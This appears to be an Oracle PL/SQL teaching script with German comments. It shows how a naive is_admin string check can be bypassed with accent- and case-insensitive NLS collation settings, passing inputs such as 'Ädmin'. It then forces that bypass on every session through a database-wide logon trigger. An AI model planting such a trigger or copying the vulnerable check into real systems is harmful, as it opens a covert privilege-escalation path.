create or replace function is_admin( i_username varchar2 )
 return integer
as
  begin
	  if ( i_username = 'ADMIN') then
      return 1;
    else
	    return 0;
		end if;
	end;
/

grant execute on is_admin to public;

select is_admin('Rebel') from dual;


ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC;

select is_admin('aDMIN') from dual;
select is_admin('Ädmin') from dual;



-- Wie kann das ausgenutzt werden?
-- LOGON-Trigger
-- Braucht Berechtigung
grant administer database trigger to scott;

-- Scott...
create or replace trigger trg_client_detection
after logon
on database
begin
	execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
end;
/

-- Deathstar...
select is_admin('Ädmin') from dual;